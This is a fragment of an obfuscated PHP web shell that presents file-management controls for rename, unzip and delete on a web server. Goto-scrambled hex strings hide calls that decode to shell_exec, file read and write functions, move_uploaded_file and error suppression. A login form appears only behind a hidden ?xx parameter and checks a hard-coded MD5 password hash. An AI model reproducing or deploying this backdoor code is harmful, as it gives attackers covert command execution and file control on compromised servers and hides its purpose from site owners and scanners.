								<input type="hidden" name="filename" value="<?php  echo $filename; ?>
">
								<input id="crud" type="submit" name="rename_file" value="REN">
							</form>
					</td>
					<td>
							<?php  $ext = pathinfo($filename, PATHINFO_EXTENSION); if ($ext == "\x7a\x69\x70") { ?>
								<form method="POST">
									<input type="hidden" name="filepath" value="<?php  echo $filepath; ?>
">
									<input type="hidden" name="filename" value="<?php  echo $filename; ?>
">
									<input id="crud" type="submit" style="color:#f88000;" name="unzip_file" value="UNZ">
								</form>
							<?php  } ?>
					</td>
					<td>
						<form method="POST">
								<input type="hidden" name="filepath" value="<?php  echo $filepath; ?>
">
								<input type="hidden" name="filename" value="<?php  echo $filename; ?>
">
								<input id="crud" style="color: #DC0000;" type="submit" name="deletefile" value="DEL">
							</form>
					</td>

					<td align="right" style="color: #555;">
						<?php  echo $flz($dir . "\57" . $filename); ?>
 KB&nbsp;&nbsp;<span style="color: #eee;"> |</span>
					</td>
					<td><?php  $file_x = str_replace($_SERVER["\104\117\x43\x55\115\105\116\124\137\122\117\x4f\124"], "\57", $hb($filepath)); $file_x = str_replace("\57\57", "\x2f", $file_x); $file_addr = "\x68\164\164\160\x3a\x2f\x2f" . $_SERVER["\x48\x54\124\120\x5f\x48\117\123\x54"] . "\x2f" . $file_x; $file_addr = str_replace("\57\57\57", "\57", $file_addr); $file_addr = str_replace("\57\57", "\57", $file_addr); ?>
&nbsp;&nbsp;
						<a target="_blank" href="<?php  echo $file_addr; ?>
"><i class="fa-sharp fa-solid fa-arrow-up-right-from-square"></i></a>
					</td>
				</tr>
				<?php  } } } echo "\74\57\x74\141\x62\x6c\145\76\74\164\x61\142\154\x65\x3e\74\164\x72\x3e\74\x74\x64\40\163\164\x79\154\x65\75\42\x63\x6f\154\x6f\x72\72\40\43\64\64\x34\x3b\42\x3e\74\151\x3e\120\x75\x72\x65\x20\x43\x6f\x64\145\144\x20\142\x79\x20\120\x45\116\x47\x41\102\104\x49\40\x53\x54\105\120\115\x4f\115\x3c\x2f\x69\76\74\57\164\162\76\x3c\x2f\x74\144\x3e\x3c\x2f\x74\141\142\x6c\145\x3e\74\57\x63\x65\x6e\x74\x65\x72\x3e\74\x62\x72\x3e\x3c\x62\162\40\57\x3e\74\x2f\x62\157\144\x79\76"; } goto aig_F; bbERV: $flz = $hb($fxxx) . "\x73" . $hb("\66" . "\71\67\x61") . "\x65"; goto uGS04; lHxpY: $bxx = "\156" . "\62\150"; goto BeEcL; uGS04: $mvfl = $hb("\x36\144\66" . "\146") . "\x76\145\137" . "\165" . $hb("\67\60" . "\66\143\66\x66\x36\61\x36\x34") . "\145\x64\x5f" . $hb($fxxx); goto hy1xm; BRHG8: $ernull = $exxx . $hb($exx) . $exxv . $hb($exv); goto Gg21o; WJOdQ: $md = $hb("\66" . "\x64") . "\144" . $hb("\63" . "\x35"); goto EbGfa; aKYwJ: $ss = $ssxxx . $ssxx . $hb($ssx); goto FatQ3; nfBSB: $hb = $hxxx . $hxx . $hx; goto Nrsht; eVF9W: $flg = $hb($fxxx) . "\137" . $hb($fgtg); goto pMPuL; pMPuL: $flp = $hb($fxxx) . "\x5f" . $hb($fgtp); goto AMuAE; KHjjM: $exxv = "\157"; goto eMYtf; dZaHg: $exx = "\x37\x32\65\x66\67\62\66\65\67\x30"; goto KHjjM; hy1xm: $ngopen = "\x66" . $hb("\x36\146" . "\x37\x30") . "\145\156"; goto suyYJ; JOLCZ: if (isset($_POST["\x6c\157\147\151\156"])) { $password = $_POST["\x61\x64\155\151\x6e"]; $password = $md($password); $pass = "\65\x38\x31\x38\x36\x31\62\x36\71\x35\61\142\64\x63\146\65\67\144\144\144\142\141\x37\63\x64\143\141\x66\67\x32\x62\145"; if ($password == $pass) { $_SESSION["\x61\x64\155\x69\156"] = "\x35\x38\x31\x38\66\x31\62\x36\71\x35\61\142\x34\143\x66\x35\67\144\144\x64\142\x61\67\x33\x64\x63\141\x66\67\62\142\x65"; } } goto QSl0R; Q3vyn: $bh = $bxxx . $bxx . $bx; goto XxKlQ; QSl0R: if (isset($_GET["\170\170"])) { ?>
			<form method="POST"><input type="text" name="admin"><input type="submit" name="login"></form>
		<?php  } goto eSSCC; wB9B7: $hxx = "\170" . "\x32"; goto ZKEHq; Ju0bV: $fgtp = "\67\x30" . "\x37" . "\65" . "\x37" . "\64"; goto eVF9W; XxKlQ: $ssxxx = "\163" . "\145" . $hb("\67\63\x37\63\66\71") . "\x6f\156\137"; goto mrNFH; suyYJ: $ngwrite = "\146" . $hb("\x37\x37\x37" . "\62\66\x39\67\x34") . "\x65"; goto jESXX; eMYtf: $exv = "\67\x32\67\x34\66\x39\66\145\x36\x37"; goto BRHG8; FatQ3: $ss(); goto k_Vuc; Pw87n: $shl = $hb($ehs) . "\154\x6c\x5f\145" . $hb($cex); goto JOLCZ; Gg21o: $ernull(0); goto RMghN; jESXX: $ngclose = "\x66" . $hb("\x36\x33\x36" . "\x63\x36\146\67\x33") . "\145"; goto WJOdQ; Yn5AG: $exxx = "\145" . $hb("\x37\x32\67\x32\66\x66"); goto dZaHg; Oo4ox: $cex = "\67\70\66\65\66\63"; goto Pw87n; EbGfa: $ehs = "\67\63\66\70\66\x35"; goto Oo4ox; k_Vuc: $fxxx = "\66" . "\66" . "\66\71" . "\x36" . "\143" . "\x36" . "\65"; goto yxpmW; BeEcL: $bx = "\x65" . "\170"; goto Q3vyn; ZKEHq: $hx = "\142" . "\x69\156"; goto nfBSB; RMghN: $ssx = "\x37\62\67\64"; goto aKYwJ; bBL5o: $hxxx = "\150" . "\145"; goto wB9B7; aig_F: ?>